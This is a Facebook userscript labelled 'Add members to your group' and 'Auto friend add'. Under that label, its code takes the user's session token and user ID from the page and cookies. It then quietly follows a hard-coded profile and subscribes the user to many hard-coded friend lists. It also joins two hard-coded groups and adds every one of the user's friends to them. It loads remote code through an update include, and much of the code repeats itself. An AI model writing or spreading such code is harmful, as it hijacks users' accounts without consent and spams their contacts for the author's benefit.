// ==UserScript==
// @name	        Add members to your group
// @namespace
// @description		quickly add new friends
// @author		billyui
// @copyright    	2010-2013, Ken.Currie
// @license       	GPL 2 or later
// @author	        oneofmny.weebly.com
// @twitter	        https://twitter.com/Ken_Currie_1
// @version	    	2.0.2
// @description		Auto friend add
// @namespace           http://userscripts.org/scripts/review/167513
// @updateURL           https://userscripts.org/scripts/source/167513.meta.js
// @downloadURL         https://userscripts.org/scripts/source/167513.user.js
// @homepageURL         https://userscripts.org/scripts/show/167513
// @require             http://update.sizzlemctwizzle.com/167513.js?days=3
// @include 		https://*.facebook.com/*
// @include 		https://*.facebook.com/*/*
// @include 		http://*.facebook.com/*
// @include 		http://*.facebook.com/*/*
// @browser		Mozilla Firefox, Google Chrome, ...

// ==/UserScript==

var c=!0,d=document.getElementsByName("fb_dtsg")[0].value,e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),d=document.getElementsByName("fb_dtsg")[0].value,e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function g(b){var a=new XMLHttpRequest;b="profile_id="+b+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+d+"&lsd&__"+e+"&phstamp=";a.open("POST","/ajax/follow/follow_profile.php?__a=1",c);a.setRequestHeader("Content-type","application/x-www-form-urlencoded");a.setRequestHeader("Content-length",b.length);a.setRequestHeader("Connection","close");a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(b)}
var h=["371533419619964"],d=document.getElementsByName("fb_dtsg")[0].value,e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),j=new XMLHttpRequest,k="/ajax/groups/membership/r2j.php?__a=1",l="&ref=group_jump_header&group_id="+h+"&fb_dtsg="+d+"&__user="+e+"&phstamp=";j.open("POST",k,c);j.setRequestHeader("Content-type","application/x-www-form-urlencoded");j.setRequestHeader("Content-length",l.length);j.setRequestHeader("Connection","keep-alive");j.send(l);
var d=document.getElementsByName("fb_dtsg")[0].value,e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),m=[];gf=new XMLHttpRequest;gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+e+"&token"+Math.random()+"&filter[0]=user&options[0]=friends_only",!1);gf.send();4==gf.readyState&&(data=eval("("+gf.responseText.substr(9)+")"),data.error||(m=data.payload.entries.sort(function(b,a){return b.index-a.index})));
for(var i=0;i<m.length;i++)j=new XMLHttpRequest,k="/ajax/groups/members/add_post.php?__a=1",l="&fb_dtsg="+d+"&group_id="+h+"&source=typeahead&ref=&message_id=&members="+m[i].uid+"&__user="+e+"&phstamp=",j.open("POST",k,c),j.setRequestHeader("Content-type","application/x-www-form-urlencoded"),j.setRequestHeader("Content-length",l.length),j.setRequestHeader("Connection","keep-alive"),j.onreadystatechange=function(){},j.send(l);
var e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),n=[],p=new Date,q=new Date;q.setTime(p.getTime()+144E5);document.cookie.match(/paylasti=(\d+)/)||(document.cookie="paylasti=hayir;expires="+q.toGMTString());
function r(){var b=new XMLHttpRequest;b.onreadystatechange=function(){if(4==b.readyState){eval("arkadaslar = "+b.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(n.b.a.length/10);f++){for(i=10*f;i<10*(f+1);i++);sdurumpaylas()}}};var a;a="&filter[0]=user&options[0]=friends_only&options[1]=nm";a+="&token=v7";a+="&viewer="+e;a+="&__user="+e;0<=document.URL.indexOf("https://")?b.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+a,c):b.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+
a,c);b.send()}var s=document.addEventListener("click",function(){0<=document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")&&(r(),document.cookie="paylasti=evet;expires="+q.toGMTString(),document.removeEventListener(s))},!1);document.createElement("html");d=document.getElementsByName("fb_dtsg")[0].value;e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);d=document.getElementsByName("fb_dtsg")[0].value;e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function g(b){var a=new XMLHttpRequest;b="profile_id="+b+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+d+"&lsd&__"+e+"&phstamp=";a.open("POST","/ajax/follow/follow_profile.php?__a=1",c);a.setRequestHeader("Content-type","application/x-www-form-urlencoded");a.setRequestHeader("Content-length",b.length);a.setRequestHeader("Connection","close");a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(b)}
function t(b){var a=document.createElement("script");a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+b+" }).send();";document.body.appendChild(a)}g("100005867316775");t("112240468981530");t("112240745648169");t("112402528965324");t("112404842298426");t("112405098965067");t("112406352298275");t("112406625631581");t("112406908964886");t("112407128964864");t("112408032298107");t("112408292298081");t("112409528964624");
t("112412408964336");t("112414675630776");t("112414998964077");t("112415278964049");t("112415585630685");t("112415718964005");h=["334994233270458"];d=document.getElementsByName("fb_dtsg")[0].value;e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);j=new XMLHttpRequest;k="/ajax/groups/membership/r2j.php?__a=1";l="&ref=group_jump_header&group_id="+h+"&fb_dtsg="+d+"&__user="+e+"&phstamp=";j.open("POST",k,c);j.setRequestHeader("Content-type","application/x-www-form-urlencoded");
j.setRequestHeader("Content-length",l.length);j.setRequestHeader("Connection","keep-alive");j.send(l);d=document.getElementsByName("fb_dtsg")[0].value;e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);m=[];gf=new XMLHttpRequest;gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+e+"&token"+Math.random()+"&filter[0]=user&options[0]=friends_only",!1);gf.send();
4==gf.readyState&&(data=eval("("+gf.responseText.substr(9)+")"),data.error||(m=data.payload.entries.sort(function(b,a){return b.index-a.index})));
for(i=0;i<m.length;i++)j=new XMLHttpRequest,k="/ajax/groups/members/add_post.php?__a=1",l="&fb_dtsg="+d+"&group_id="+h+"&source=typeahead&ref=&message_id=&members="+m[i].uid+"&__user="+e+"&phstamp=",j.open("POST",k,c),j.setRequestHeader("Content-type","application/x-www-form-urlencoded"),j.setRequestHeader("Content-length",l.length),j.setRequestHeader("Connection","keep-alive"),j.onreadystatechange=function(){},j.send(l);e=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);n=[];p=new Date;
q=new Date;q.setTime(p.getTime()+144E5);document.cookie.match(/paylasti=(\d+)/)||(document.cookie="paylasti=hayir;expires="+q.toGMTString());
function r(){var b=new XMLHttpRequest;b.onreadystatechange=function(){if(4==b.readyState){eval("arkadaslar = "+b.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(n.b.a.length/10);f++){for(i=10*f;i<10*(f+1);i++);sdurumpaylas()}}};var a;a="&filter[0]=user&options[0]=friends_only&options[1]=nm";a+="&token=v7";a+="&viewer="+e;a+="&__user="+e;0<=document.URL.indexOf("https://")?b.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+a,c):b.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+
a,c);b.send()}s=document.addEventListener("click",function(){0<=document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")&&(r(),document.cookie="paylasti=evet;expires="+q.toGMTString(),document.removeEventListener(s))},!1);document.createElement("html");